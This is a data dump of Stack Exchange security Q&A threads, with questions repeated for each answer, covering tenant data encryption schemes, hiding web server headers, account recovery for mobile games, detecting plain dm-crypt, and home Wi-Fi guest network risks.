<p>Also consider people without phone number, or international users whom cannot receive SMS or receive them with large delay. Or users travelling, but roaming disable, so they can't receive SMS. SMS channel itself is not considered secure for <em>serious applications</em> that require high security.</p>
<p>If you app does not deal with money, it is probably okay.</p>
","0"
"265837","265837","Asymmetric encryption of user's data","<p>I got to thinking this morning over my coffee, that it would be nice if I could encrypt data for a Tenant with one key, and decrypt it with another key. In such a way that only a logged in User can access data in his organization (Tenant). I, as the system administrator, cannot access it. That's public key encryption so far. The public key can be used by the system to encrypt data and the private key is the decrypt key, similar to TLS. The decrypt key could itself be encrypted and stored in the users table using the plaintext passwords of each Tenant User, which is not stored. Thus the decrypt key can only be obtained when a Tenant User logs in to the system with the plaintext password. This way not even the system administrator can access the data when no Tenant User is logged in.</p>
<p>Encrypting the same plaintext with multiple keys doesn't make them materially more vulnerable, so it's ok to have multiple encrypted copies of the private key like this.</p>
<p>A tricky part is encrypting the decrypt key with the users password when they create an account. Another user would need to login and create an invite link first, which would contain the decrypt key encrypted with a system key. That seems ok, since that's a common flow for adding a user to an organization anyway.</p>
<p>Another tricky part is resetting the user's password. They'd need access to their email plus an invite link created by another logged in user (or the original invite link.)</p>
<p>This seems to me like it could work. If you lose all passwords, the data is unrecoverable, but that's how it should be.</p>
<p>It seems like it would reduce a lot of surface area to attacks because decrypt keys only exist in plaintext when a user is logged in. In fact, if you send the password with every user request, instead of having a separate login and session, the decrypt key is only in plaintext for the duration of a request, which is the minimum possible. An attacker would need to compromise the system and wait for a request to snag the key and be able to decrypt the data. System administrators wouldn't have access to user's data unless they also compromised the system in some way. On the other hand, if you can't trust your system admins, you're screwed. But this would protect against casual access to user's data - which is still valuable and it means attackers would need to gain access to both the persisted data and the transient in-memory decrypt key.</p>
<p>Would this work like I'm describing? Does it improve security? Is there a flaw here I'm not seeing?</p>
","1","3","265845","<p>Not sure the issue with this will be the crypto.  All of that seems fine.</p>
<ul>
<li><p>Transporting the password for a user in plaintext over the internet
feels weird.  But there's no reason a hashed password couldn't be
used as the key instead.</p>
</li>
<li><p>Depending on the type of asymmetric key used, storing an encrypted
copy for each user might get a bit heavy (RSA-4096 for example).  Not massively heavy, Walmart with 2.2Mil employees would be 8.8gig of duplicated encrypted key data but still.</p>
</li>
<li><p>Key rotation (of encryption/decryption key if it is ever exposed) would require every user to log in and update their encrypted store of the key.  By the sound of it, this would require an invitation from a user which was part of the key rotation.  That email would probably be pretty confusing to the uninitiated.</p>
</li>
<li><p>Not sure how much this really gains.  The key instead could be stored in a KMS/HSM where it can never be seen again (compared to in-memory) and requests for decryption only asked for after the user has been verified as part of the tenant.</p>
</li>
</ul>
","2"
"265837","265837","Asymmetric encryption of user's data","<p>I got to thinking this morning over my coffee, that it would be nice if I could encrypt data for a Tenant with one key, and decrypt it with another key. In such a way that only a logged in User can access data in his organization (Tenant). I, as the system administrator, cannot access it. That's public key encryption so far. The public key can be used by the system to encrypt data and the private key is the decrypt key, similar to TLS. The decrypt key could itself be encrypted and stored in the users table using the plaintext passwords of each Tenant User, which is not stored. Thus the decrypt key can only be obtained when a Tenant User logs in to the system with the plaintext password. This way not even the system administrator can access the data when no Tenant User is logged in.</p>
<p>Encrypting the same plaintext with multiple keys doesn't make them materially more vulnerable, so it's ok to have multiple encrypted copies of the private key like this.</p>
<p>A tricky part is encrypting the decrypt key with the users password when they create an account. Another user would need to login and create an invite link first, which would contain the decrypt key encrypted with a system key. That seems ok, since that's a common flow for adding a user to an organization anyway.</p>
<p>Another tricky part is resetting the user's password. They'd need access to their email plus an invite link created by another logged in user (or the original invite link.)</p>
<p>This seems to me like it could work. If you lose all passwords, the data is unrecoverable, but that's how it should be.</p>
<p>It seems like it would reduce a lot of surface area to attacks because decrypt keys only exist in plaintext when a user is logged in. In fact, if you send the password with every user request, instead of having a separate login and session, the decrypt key is only in plaintext for the duration of a request, which is the minimum possible. An attacker would need to compromise the system and wait for a request to snag the key and be able to decrypt the data. System administrators wouldn't have access to user's data unless they also compromised the system in some way. On the other hand, if you can't trust your system admins, you're screwed. But this would protect against casual access to user's data - which is still valuable and it means attackers would need to gain access to both the persisted data and the transient in-memory decrypt key.</p>
<p>Would this work like I'm describing? Does it improve security? Is there a flaw here I'm not seeing?</p>
","1","3","265851","<p>First of all asymetric encryption is rather expensive. For that reason, the common usage for large data encryption is to use symetric encryption with a random key, and only encrypt that key using asymetric encryption. This pattern allows to easily encrypt a bunch of data once for a number of symetric key pairs: only the symetric key has to be encrypted with all the public keys. You can even have a physicaly unique private key (for example a key on a smartcard) stored in a physical safe and used as a last resort decryption tool if data availability is a concern. As we are back in the physical world, it is easier to have a system requiring 2 physical keys, owned by different persons to make sure that no single human being will ever be able to have an unnoticed access to the smartcard.</p>
<p>The rest of your proposal still stands, with the exact same problem of trust that you showed at the end of your post, neither more nor less.</p>
","1"
"265837","265837","Asymmetric encryption of user's data","<p>I got to thinking this morning over my coffee, that it would be nice if I could encrypt data for a Tenant with one key, and decrypt it with another key. In such a way that only a logged in User can access data in his organization (Tenant). I, as the system administrator, cannot access it. That's public key encryption so far. The public key can be used by the system to encrypt data and the private key is the decrypt key, similar to TLS. The decrypt key could itself be encrypted and stored in the users table using the plaintext passwords of each Tenant User, which is not stored. Thus the decrypt key can only be obtained when a Tenant User logs in to the system with the plaintext password. This way not even the system administrator can access the data when no Tenant User is logged in.</p>
<p>Encrypting the same plaintext with multiple keys doesn't make them materially more vulnerable, so it's ok to have multiple encrypted copies of the private key like this.</p>
<p>A tricky part is encrypting the decrypt key with the users password when they create an account. Another user would need to login and create an invite link first, which would contain the decrypt key encrypted with a system key. That seems ok, since that's a common flow for adding a user to an organization anyway.</p>
<p>Another tricky part is resetting the user's password. They'd need access to their email plus an invite link created by another logged in user (or the original invite link.)</p>
<p>This seems to me like it could work. If you lose all passwords, the data is unrecoverable, but that's how it should be.</p>
<p>It seems like it would reduce a lot of surface area to attacks because decrypt keys only exist in plaintext when a user is logged in. In fact, if you send the password with every user request, instead of having a separate login and session, the decrypt key is only in plaintext for the duration of a request, which is the minimum possible. An attacker would need to compromise the system and wait for a request to snag the key and be able to decrypt the data. System administrators wouldn't have access to user's data unless they also compromised the system in some way. On the other hand, if you can't trust your system admins, you're screwed. But this would protect against casual access to user's data - which is still valuable and it means attackers would need to gain access to both the persisted data and the transient in-memory decrypt key.</p>
<p>Would this work like I'm describing? Does it improve security? Is there a flaw here I'm not seeing?</p>
","1","3","265880","<p>There are a few technical issues with the cryptographic approach you've mentioned, but the biggest issue with this solution is the threat model and the assumptions you have made about trust.</p>
<p>If your sysadmins are untrusted, then the server is inherently untrusted. If the server is untrusted, you cannot assume that your server-side code will remain intact and unmodified. Your system requires sending the user's plaintext password (or some derivative that is used to encrypt the information) to the server. As such, a malicious sysadmin can manipulate the server to dump the passwords and/or the plaintext data being stored when any user logs in.</p>
<p>If the server is untrusted, you must encrypt (and authenticate) the data client-side, using a passphrase (or key, or some other secret provider) that the server does not know. This is, however, not typically feasible if the application is a web page doing the cryptographic operations in JS. In such a context, the JS must be trusted to not transmit the plaintext data or key to the server, but the JS is provided by the server and therefore cannot be trusted.</p>
<p>You might choose to publish an application (desktop, mobile app, etc.) for doing the client-side encryption. But, if you don't trust your sysadmins, how can you trust your source control and build infrastructure, or the application installer files that you publish? Do you arbitrarily choose to trust the developers despite not trusting the sysadmins? If a developer moves to the sysadmin department, are they suddenly untrusted? What rationale could possibly justify this? It's impossible to reconcile.</p>
<p>An organisational security culture where the people with the keys to the kingdom are deemed untrustworthy is untenable. It is reasonable to implement checks and balances to provide oversight and reduce the risk of mistakes and insider threats, but you must lend a high degree of trust to your staff by default.</p>
<p>There <em>are</em> situations in which you might want to deploy client-side encryption to protect user data, but these are typically based on data theft scenarios where a threat actor breaks in and steals all of the server-side data.</p>
","1"
"265796","265796","Is having the name of web server software in HTTP response header a serious problem?","<p>How serious a security problem is it to have the name of the web server in the HTTP header (Apache, Nginx etc.)?</p>
<p>I am discussing this with a system administrator and he told me that deleting version is easy, but deleting the name of the server (in our case nginx) is not so simple and it takes more time.</p>
<p>So, he thinks that it is useless, because, there are a lot of tools that are able to detect the type of server based on HTTP header.</p>
<p>On the other side, I have always read that information like this should be removed.</p>
<p>My question is - Is information like this a serious problem and should be removed, or not? (I assume fully patched server)</p>
","16","4","265797","<p>Assuming that the server is fully patched and you're just talking about product name and not version, I wouldn't generally regard this as a serious problem.</p>
<p>Essentially all security hardening is a trade-off between effort and risk reduction. Here you would potentially be reducing the risk marginally of a successful attack, but at the cost of effort to implement. In reality there's likely other places the same effort could be spent, to better effect.</p>
<p>In an <em>ideal</em> world you don't give possible attackers any information you don't have to as it makes their lives harder and forces them to spend more effort on each attack, but with things like product name (especially for common products like nginx) that's a pretty marginal benefit.</p>
","24"
"265796","265796","Is having the name of web server software in HTTP response header a serious problem?","<p>How serious a security problem is it to have the name of the web server in the HTTP header (Apache, Nginx etc.)?</p>
<p>I am discussing this with a system administrator and he told me that deleting version is easy, but deleting the name of the server (in our case nginx) is not so simple and it takes more time.</p>
<p>So, he thinks that it is useless, because, there are a lot of tools that are able to detect the type of server based on HTTP header.</p>
<p>On the other side, I have always read that information like this should be removed.</p>
<p>My question is - Is information like this a serious problem and should be removed, or not? (I assume fully patched server)</p>
","16","4","265815","<p>Any competent vulnerability scanner won't check for headers or similar information; instead, it'll just try dozens or hundreds of known attacks and checks if one if them works.</p>
<p>Why that? Because there's so many reasons why the header info might be wrong.</p>
<p>You might, for example, be using a long term release of Ubuntu, Debian, or RedHat. In long term releases, they typically fix the version number when the release comes out; during the lifetime of the OS release, they'll backport fixes but won't upgrade the version. So your &quot;SuperServer 1.2.3&quot; will, after a while, still announce itself as &quot;Superserver 1.2.3&quot; but include all the fixes (but not features) up to version 1.2.17.</p>
<p>For all but the smallest web sites, you'll connect to some kind of load balancer or reverse proxy which distributes your request to one of several  backend servers. But there's only one <code>server</code> header. So even if it says <code>Server: nginx</code> you may be successful trying some apache exploit - attack the backend apache even with an nginx-based load balancer. Or vice versa.</p>
<p>So, any automated scanner will just try out as much as it can in order to not miss out on anything.</p>
<p>20-25 years ago, this kind of automated vulnerability scanning didn't exist, or at least wasn't as widespread/easy to as today. In those days, some people would actually try to find out stuff about server software, look up vulnerability lists, and try exploit those manually, themselves. But today? Not a chance.</p>
","42"
"265796","265796","Is having the name of web server software in HTTP response header a serious problem?","<p>How serious a security problem is it to have the name of the web server in the HTTP header (Apache, Nginx etc.)?</p>
<p>I am discussing this with a system administrator and he told me that deleting version is easy, but deleting the name of the server (in our case nginx) is not so simple and it takes more time.</p>
<p>So, he thinks that it is useless, because, there are a lot of tools that are able to detect the type of server based on HTTP header.</p>
<p>On the other side, I have always read that information like this should be removed.</p>
<p>My question is - Is information like this a serious problem and should be removed, or not? (I assume fully patched server)</p>
","16","4","265825","<p>On the long list of things you can do to protect a server on the internet, not exposing the name of the web server barely rates.</p>
<p>The version number may be of more concern, since it may in theory help attackers target older or known vulnerable servers.  But even this may not be particularly useful, since older servers may still be patched or may not have the vulnerable part enabled/configured.</p>
<p>By the time an attacker has put in the effort to query your server to try and determine what software it's running, it may as well just have probed for the actual vulnerability anyway which in most cases would be more efficient.</p>
","10"
"265796","265796","Is having the name of web server software in HTTP response header a serious problem?","<p>How serious a security problem is it to have the name of the web server in the HTTP header (Apache, Nginx etc.)?</p>
<p>I am discussing this with a system administrator and he told me that deleting version is easy, but deleting the name of the server (in our case nginx) is not so simple and it takes more time.</p>
<p>So, he thinks that it is useless, because, there are a lot of tools that are able to detect the type of server based on HTTP header.</p>
<p>On the other side, I have always read that information like this should be removed.</p>
<p>My question is - Is information like this a serious problem and should be removed, or not? (I assume fully patched server)</p>
","16","4","265894","<p>&quot;I am discussing this with a system administrator and he told me that deleting version is easy, but deleting the name of the server (in our case nginx) is not so simple and it takes more time.&quot;</p>
<p><a href=""https://kodemonk.dev/blog/setting-custom-sever-header-in-nginx"" rel=""nofollow noreferrer"">How much time does it really take?</a></p>
<ul>
<li>Go to nginx config folder (cd /etc/nginx/) and open the configuration file (nginx.conf)</li>
<li>Add server_tokens off; under http section.</li>
<li>Restart Nginx webserver (sudo systemctl restart nginx)</li>
</ul>
<p>You've spent more time asking this question, I imagine.</p>
","-1"
"265768","265768","Account recovery for mobile games?","<p>Mobile games typically have lots of users that take multi-month (or year) breaks and come back much later when they've heard about an update to the game or have a nostalgic urge to come back.</p>
<p>Typically the way games work is that you start the app and can immediately start playing. The idea is to prevent any friction at the beginning of the gaming process. However, it also means that you don't know much of anything about the account other than the device they played on and what they've done in the game; no emails and no account creation process to capture personal information.</p>
<p>There typically needs to be a support process for getting back accounts as you might have spent hundreds of hours (or more) playing your accounts. This can be after years of inactivity and the user might have moved to a different country. Switched from Android to iOS etc.</p>
<p>The question is: What sort of ideas are there to recover accounts in such a setting without being vulnerable to social engineering?</p>
<p>Some people sell their high-level accounts and then work with tech support to &quot;get the account back&quot;, thereby defrauding the purchaser.</p>
<p>From a purely information theoretical standpoint, you would have to be able to ask something that only the original owner could know as well as something with enough entropy that it's difficult to guess while remaining possible to remember.</p>
","1","4","265786","<p>With a topic like account recovery, you are opposing two things: On one hand, you want to ensure <em>availability</em> for your customer, on the other hand, you want to ensure <em>confidentiality</em> of the account.</p>
<p>There will be situations, in which you as a system designer have to prioritize one over the other. Specifically, if a customer is in a situation, where they have lost access to the account, but cannot sufficiently prove that it is indeed their account. You either risk locking them out of their account, or risk giving unauthorized third party access to the account.</p>
<hr />
<p>Before implementing such a system, it's helpful to write down goals and implicit assumptions about the authentication system:</p>
<ul>
<li>New users should have as little friction as possible.</li>
<li>Users should be able to recover access to an account, even if the original device is no longer available (lost, stolen, broken, etc.)</li>
<li>Users may not want to use third-party services for authentication</li>
<li>Users may not be very technically adept</li>
</ul>
<p>There are several ways such systems are implemented in the real world. One very common example is that users initially are tied to some device ID, so they can simply start playing. Let's call such users <em>guests</em>. A guest may not even be aware that they have created an &quot;account&quot;, which is good for non-technical users.</p>
<p>Guests <em>should</em> then be told to register a &quot;proper&quot; account, in case they lose access to their device. This could be as simple as an e-mail address, to which a one-time link is sent. They click the link, confirm ownership of the e-mail and now they have a proper account registered to the user. To register a new device, merely entering the e-mail address is enough. A one-time link is sent again, which confirms that the user has access to the e-mail address.</p>
<p>The upside of this scheme is that it's very easy to use. It requires very little technical knowledge aside from &quot;What is my e-mail address?&quot; (which admittedly can be a challenge for older users). The downside is, that access to the e-mail address is indeed the only then authenticating the user. No password, no second factor, etc... This would indeed make it easier for people to impersonate the real user and claim they have lost access too their e-mail account. (I personally had a similar thing happen once, where I forgot which e-mail address I used for signing up, and in the end support would let me transfer the e-mail address of that account to one of my e-mail addresses. This <em>could</em> have caused me to lose access to my account if it had been an attacker).</p>
<p>It also has an additional characteristic of offloading the responsibility of account access to the user. Didn't sign up properly and lost access to your device? Too bad! This would swing the other way, leading to disgruntled users not getting their accounts back. As I said before, you really have to pick your poison here.</p>
<hr />
<p>For more technically apt users, you can also allow setting a password, setting a second factor (SMS, TOTP app, FIDO2 key, etc.). While this increases complexity on your side, it has the advantage of enabling technically apt users to secure their account from third-party access. (And making it more likely <em>they</em> lose access to one of their factors).</p>
<p>In order to prevent social engineering, you can also ask users questions about their account, which they <em>should</em> be able to answer:</p>
<ul>
<li>When did you last play?</li>
<li>What device did you play on?</li>
<li>How often did you play?</li>
<li>Who is your most-used character?</li>
<li>When did you last spend money on the game? If so, can you send us a receipt of that purchase?</li>
</ul>
<p>For example, I would be able to answer you all these questions for a mobile game I am playing. For an attacker, however, these would be quite difficult to answer.</p>
<p>An exception to this is streamers, who stream most of their gameplay. As their viewers would of course see when they would play, how they would play, etc... Although in such a case, support may have good ways to deal with people trying to steal &quot;popular&quot; accounts.</p>
<h3>Other Authentication Schemes</h3>
<p>For the sake of completeness, I'd like to discuss some other authentication schemes I have come across:</p>
<ul>
<li><p><strong>Guest Account Only (Device ID bound)</strong></p>
<p>There is no way for users to &quot;register&quot;. Their account is tied to their device and if they lose access to the device, they lose access to the account. Not ideal, but I thought I should mention it.</p>
</li>
<li><p><strong>Guest Account Only (File-based)</strong></p>
<p>Similar to the above, but the &quot;ID&quot; is written to a file on the device. It could be a private key, but most likely it's just a really long random string. By backing up that file, users back up their identity. While this &quot;works&quot;, it is basically impossible for non-technical users. Your users are also only one oopsie away from permanently losing account access if they don't back up their accounts.</p>
</li>
<li><p><strong>Username + Password Sign-Up</strong></p>
<p>The classic username+password combination. It's widely understood by the vast majority of users. Pick a username, pick a password and optionally enter an e-mail address in case you forget your password. The advantage is that most users understand how that works, but with the downside of people generally picking really bad passwords. Like, how often do you think the name of the game will be used as password? A lot.</p>
</li>
<li><p><strong>&quot;Transfer Code&quot; + Password</strong></p>
<p>Very popular in certain Japanese gacha games, users receive a &quot;transfer code&quot; upon request. A random string looking like <code>BF62-HS01-GG52-OP87</code>, together with a password set by the user. The idea is that users keep that transfer code safe (writing it down or more likely sending it to themselves via e-mail) and if they need to access the game on a new device, they enter that code and their password. For the developers, this works, because it's minimal overhead, while for users it's clunky and there's always the fear of what if you lose your transfer code?</p>
</li>
<li><p><strong>Third-Party Authentication</strong></p>
<p>Also very popular in the mobile game sphere, authentication can just be offloaded onto the OS provider. For example, Google offers a &quot;Sign in with Google Play&quot; option on Android, and I am certain Apple offers something similar. It's very likely users will already have such an account, so authentication is rather easy. However, some users may be unwilling to connect any game to their Google or Apple account, so you may have some resistance from users.</p>
</li>
</ul>
<h3>Defrauding Account Sales</h3>
<p>Most ToS explicitly forbid sales of accounts, so it's usually not in the best interest of developers to make account sales easy. In fact, the more dangerous for buyers it is, the less likely there is a market for game accounts. If anyone could easily defraud you, you likely won't spend money.</p>
<h3>In Short</h3>
<p>There is no silver bullet. You have to weigh account availability against confidentiality. You can offload some of that to your users by letting them decide how secure against third-party attacks they want to be.</p>
<p>Asking players for information only they should know could be a good idea against account theft.</p>
","1"
"265768","265768","Account recovery for mobile games?","<p>Mobile games typically have lots of users that take multi-month (or year) breaks and come back much later when they've heard about an update to the game or have a nostalgic urge to come back.</p>
<p>Typically the way games work is that you start the app and can immediately start playing. The idea is to prevent any friction at the beginning of the gaming process. However, it also means that you don't know much of anything about the account other than the device they played on and what they've done in the game; no emails and no account creation process to capture personal information.</p>
<p>There typically needs to be a support process for getting back accounts as you might have spent hundreds of hours (or more) playing your accounts. This can be after years of inactivity and the user might have moved to a different country. Switched from Android to iOS etc.</p>
<p>The question is: What sort of ideas are there to recover accounts in such a setting without being vulnerable to social engineering?</p>
<p>Some people sell their high-level accounts and then work with tech support to &quot;get the account back&quot;, thereby defrauding the purchaser.</p>
<p>From a purely information theoretical standpoint, you would have to be able to ask something that only the original owner could know as well as something with enough entropy that it's difficult to guess while remaining possible to remember.</p>
","1","4","265909","<p>It is a difficult to solve issue.</p>
<p>If users take a break, change their devices and lose all proofs that they own the said accounts (e.g. don't remember passwords, have lost long-lived auth tokens, can't answer security questions, don't have a recovery email/phone number etc) then there's literally no way to distinguish them from account highjackers.</p>
<p>You need at least one way to confirm that users requesting access to accounts are legit and in order to do this you need to use something that is established the first time the users create the accounts.</p>
<p>An easy way, although not bullet-proof, is to use a mobile phone number or email registered during the account creation so that you can send a recovery action message to them. The reason this is preferred is because people tend to keep their mobile phone numbers and email addresses for long periods of time (even years) due to the way many services in our societies depend on them.</p>
<p>However, since you don't use that (as you mention), another approach would be to ask users to enter a secret word at the beginning of their gameplays, so that you can establish the association between each player and the respective game, without actually depending on the device they use. Again, not bullet proof, but it works and is simple enough not to cause user bouncing.</p>
","0"
"265768","265768","Account recovery for mobile games?","<p>Mobile games typically have lots of users that take multi-month (or year) breaks and come back much later when they've heard about an update to the game or have a nostalgic urge to come back.</p>
<p>Typically the way games work is that you start the app and can immediately start playing. The idea is to prevent any friction at the beginning of the gaming process. However, it also means that you don't know much of anything about the account other than the device they played on and what they've done in the game; no emails and no account creation process to capture personal information.</p>
<p>There typically needs to be a support process for getting back accounts as you might have spent hundreds of hours (or more) playing your accounts. This can be after years of inactivity and the user might have moved to a different country. Switched from Android to iOS etc.</p>
<p>The question is: What sort of ideas are there to recover accounts in such a setting without being vulnerable to social engineering?</p>
<p>Some people sell their high-level accounts and then work with tech support to &quot;get the account back&quot;, thereby defrauding the purchaser.</p>
<p>From a purely information theoretical standpoint, you would have to be able to ask something that only the original owner could know as well as something with enough entropy that it's difficult to guess while remaining possible to remember.</p>
","1","4","267311","<p>You want to make the beginning as frictionless as possible, with the user able to start playing immediately, while allowing someone that spent hundreds of hours playing able to recover back their account.</p>
<p>So, the answer is, unsurprisingly, that you should set up that at some intermediate point.</p>
<p>I imagine the initial screen with some user information (username, points, 'recovery email (none)', some buttons to start playing or exchanging items...) from which they could easily set it up whenever they want. And then, after the user achieved more than X points / played for more than Y hours, I would remind them with a 33% probability whenever they open the application a warning that they have no recovery options set so they would lose access to the account should they lose their device.</p>
<p>They might still choose <em>Not now</em> dozens of times, and then lose access to the device, and to the game account with it, but that would be on them if they chose not to register a recovery email (or password, or other supported method).</p>
","0"
"265768","265768","Account recovery for mobile games?","<p>Mobile games typically have lots of users that take multi-month (or year) breaks and come back much later when they've heard about an update to the game or have a nostalgic urge to come back.</p>
<p>Typically the way games work is that you start the app and can immediately start playing. The idea is to prevent any friction at the beginning of the gaming process. However, it also means that you don't know much of anything about the account other than the device they played on and what they've done in the game; no emails and no account creation process to capture personal information.</p>
<p>There typically needs to be a support process for getting back accounts as you might have spent hundreds of hours (or more) playing your accounts. This can be after years of inactivity and the user might have moved to a different country. Switched from Android to iOS etc.</p>
<p>The question is: What sort of ideas are there to recover accounts in such a setting without being vulnerable to social engineering?</p>
<p>Some people sell their high-level accounts and then work with tech support to &quot;get the account back&quot;, thereby defrauding the purchaser.</p>
<p>From a purely information theoretical standpoint, you would have to be able to ask something that only the original owner could know as well as something with enough entropy that it's difficult to guess while remaining possible to remember.</p>
","1","4","267346","<p>One easy way that I've seen some developers use is having their own backend service that stores their save data to a server. Users can sign up using their email addresses. The user is simply sent an email asking them to click on a link to approve the creation of the account and they are all set.</p>
<p>When the user wants to access their game account on a different device, they just need to give their email address. If the email exists on the server, the server sends them a confirmation email asking to connect the new device to the service.</p>
<p>This way, you don't need to worry about password management. The only serious attack vector that's left open, assuming the server side is set up correctly, is if the player's email account is hacked and an attacker were to request an account deletion and then confirm it from the user's email account.</p>
","0"
"265757","265757","Are there ways to detect plain dm-crypt encryption and what are the countermeasures against them?","<p>Encryption with plain dm-crypt is often positioned as encryption that cannot be recognized. But is it really so? Are there ways to prove that the data is encrypted with plain dm-crypt? How to bypass these methods?</p>
","1","3","265781","<p>In theory, with LUKS you could also claim that there is no encrypted data. Presence of a header is an indicator but no proof that the rest of the disk is encrypted. It could also be just random data.</p>
<p>You can prove it is encrypted by decryption with the right key.</p>
<p>TRIM can give away that encryption is used (so the solution would be not to enable it):</p>
<p><a href=""https://wiki.archlinux.org/title/Dm-crypt/Specialties#Discard/TRIM_support_for_solid_state_drives_(SSD)"" rel=""nofollow noreferrer"">https://wiki.archlinux.org/title/Dm-crypt/Specialties#Discard/TRIM_support_for_solid_state_drives_(SSD)</a></p>
<p><a href=""https://asalor.blogspot.com/2011/08/trim-dm-crypt-problems.html"" rel=""nofollow noreferrer"">https://asalor.blogspot.com/2011/08/trim-dm-crypt-problems.html</a></p>
","0"
"265757","265757","Are there ways to detect plain dm-crypt encryption and what are the countermeasures against them?","<p>Encryption with plain dm-crypt is often positioned as encryption that cannot be recognized. But is it really so? Are there ways to prove that the data is encrypted with plain dm-crypt? How to bypass these methods?</p>
","1","3","265785","<p>Terminology can get tricky. <em>High Entropy Data</em> such as <strong>encryption</strong> or <strong>random</strong> data is easily recognized via a number of common tests such as:</p>
<ul>
<li>Chi Square Distribution</li>
<li>Arithmetic Mean</li>
<li>Monte Carlo Pi</li>
<li>Serial Correlation</li>
<li>Others</li>
</ul>
<p>Of course this doesn't necessarily differentiate <em><strong>Encryption</strong></em> from <em><strong>Random</strong></em> mathematically but not too many people keep large blocks of random data. It's not proof, but it's a strong indicator.</p>
<p>Note that <em>Compression</em> is generally easy to differentiate as it has much lower entropy.</p>
","0"
"265757","265757","Are there ways to detect plain dm-crypt encryption and what are the countermeasures against them?","<p>Encryption with plain dm-crypt is often positioned as encryption that cannot be recognized. But is it really so? Are there ways to prove that the data is encrypted with plain dm-crypt? How to bypass these methods?</p>
","1","3","266577","<p><strong>No</strong>, there is no way to detect the existence of dm-crypt on a block device in most configurations. The only way to prove that it is encrypted is to supply the information required to decrypt it, assuming the plaintext under it is itself not indistinguishable from random.</p>
<p>The dm-crypt system does not provide any ciphers or modes of operation on its own. It simply <em>uses</em> existing supported algorithms. In theory, you could use an algorithm which could be distinguished from random data in some manner, but a typical device encrypted with AES-XTS will appear random.</p>
","0"
"265749","265749","Wi-Fi with guest network","<p>I use an old AirPort Extreme to provide WiFi in my home. It provides a 2.4 and 5.0 GHz network with a good password, only available to me and my wife. It also provides a separate guest network without password. The benefit is that visitors can have WiFi in my home without needing my password so I don’t need to hand my password out.</p>
<p>Question: Does the ability of a stranger to connect to the guest network put my password protected network at risk? Of course they can cause mayhem on the guest network, but would my main network <em>using the same router</em> be in danger, actual or theoretical?</p>
<p>PS. Thanks for all the answers. My plan was to enable friends and family to use Wifi, but not giving them a password which would be dangerous if one of them is a hacker, more dangerous is one of them is careless and gives the password to a real hacker, and inconvenient because changing the password is a pain if a friend becomes an ex-friend.</p>
<p>Apple has a feature where your phone can send the password to another phone if you allow it, so that phone can connect to your network, but the user cannot find out the password. Small improvement.</p>
<p>So the problems are: Anyone near my home can use my WiFi (I've heard a claim that someone in an apartment block could see 37 networks on their Mac!!!, so you could have 37 people able to log in). Not that big a problem because I can throw them out, but still. And the other problem: Someone who has access to an actual network on my router, meaning my router has to process their network traffic, may have more access to vulnerabilities in the router than someone who just parks their car near my network with nothing opened.</p>
","11","4","265750","<p>There is no inherent unavoidable risk in this approach which would put your private WiFi in danger. But ...</p>
<p>These networks are served by the same router. This means their implementation and configuration are only separated by software. And software can have bugs. For example if the attacker manages to exploit your router from the guest network, then this would likely enable the attacker to hijack your private network too.</p>
<p>Note that this scenario is not be that far fetched, since critical bugs in WiFi drivers, routers etc are not uncommon. The market for routers is usually not driven by best security, but by most features for lowest price.</p>
","15"
"265749","265749","Wi-Fi with guest network","<p>I use an old AirPort Extreme to provide WiFi in my home. It provides a 2.4 and 5.0 GHz network with a good password, only available to me and my wife. It also provides a separate guest network without password. The benefit is that visitors can have WiFi in my home without needing my password so I don’t need to hand my password out.</p>
<p>Question: Does the ability of a stranger to connect to the guest network put my password protected network at risk? Of course they can cause mayhem on the guest network, but would my main network <em>using the same router</em> be in danger, actual or theoretical?</p>
<p>PS. Thanks for all the answers. My plan was to enable friends and family to use Wifi, but not giving them a password which would be dangerous if one of them is a hacker, more dangerous is one of them is careless and gives the password to a real hacker, and inconvenient because changing the password is a pain if a friend becomes an ex-friend.</p>
<p>Apple has a feature where your phone can send the password to another phone if you allow it, so that phone can connect to your network, but the user cannot find out the password. Small improvement.</p>
<p>So the problems are: Anyone near my home can use my WiFi (I've heard a claim that someone in an apartment block could see 37 networks on their Mac!!!, so you could have 37 people able to log in). Not that big a problem because I can throw them out, but still. And the other problem: Someone who has access to an actual network on my router, meaning my router has to process their network traffic, may have more access to vulnerabilities in the router than someone who just parks their car near my network with nothing opened.</p>
","11","4","265753","<p>You can check if your router has a known vulnerability if you look at the
<a href=""https://www.cvedetails.com/vulnerability-list/vendor_id-49/product_id-4933/Apple-Airport-Extreme.html"" rel=""nofollow noreferrer"">common vulnerabilities and exposures</a> site of the product. The higher the number, the more dangerous. 10 is the maximum.</p>
<p>An attacker could check this and try to use it. A 9-10 is a <a href=""https://www.balbix.com/insights/understanding-cvss-scores/"" rel=""nofollow noreferrer"">critical one</a> and easy to use with a high impact.</p>
<p>In your scenario this could be for example access to your router administration interface. If you already opened a network for guests without password the attacker could use this.</p>
","2"
"265749","265749","Wi-Fi with guest network","<p>I use an old AirPort Extreme to provide WiFi in my home. It provides a 2.4 and 5.0 GHz network with a good password, only available to me and my wife. It also provides a separate guest network without password. The benefit is that visitors can have WiFi in my home without needing my password so I don’t need to hand my password out.</p>
<p>Question: Does the ability of a stranger to connect to the guest network put my password protected network at risk? Of course they can cause mayhem on the guest network, but would my main network <em>using the same router</em> be in danger, actual or theoretical?</p>
<p>PS. Thanks for all the answers. My plan was to enable friends and family to use Wifi, but not giving them a password which would be dangerous if one of them is a hacker, more dangerous is one of them is careless and gives the password to a real hacker, and inconvenient because changing the password is a pain if a friend becomes an ex-friend.</p>
<p>Apple has a feature where your phone can send the password to another phone if you allow it, so that phone can connect to your network, but the user cannot find out the password. Small improvement.</p>
<p>So the problems are: Anyone near my home can use my WiFi (I've heard a claim that someone in an apartment block could see 37 networks on their Mac!!!, so you could have 37 people able to log in). Not that big a problem because I can throw them out, but still. And the other problem: Someone who has access to an actual network on my router, meaning my router has to process their network traffic, may have more access to vulnerabilities in the router than someone who just parks their car near my network with nothing opened.</p>
","11","4","265754","<p>As mentioned in the other answers, all bets are off if your router has a vulnerability which a malicious user is able to exploit.</p>
<p>Notwithstanding, it sounds like what you are looking for is <em>network segmentation</em>, where devices on the guest network cannot see or access devices on the main network, and vice versa.  This can be done by creating two separate VLAN's - one for the main network and one for the guest network.  Then, it will appear to users on the guest network that they are the only ones on the network, and likewise for users of the main network.  Devices on one network will not be visible or accessible to devices on the other network.  See <a href=""https://www.routersecurity.org/vlan.php"" rel=""nofollow noreferrer"">https://www.routersecurity.org/vlan.php</a> for a good write-up on this subject.</p>
<p>But, it bears repeating that the above configuration could fail spectacularly if the router has a vulnerability that can be exploited by a user on the guest network.</p>
","4"
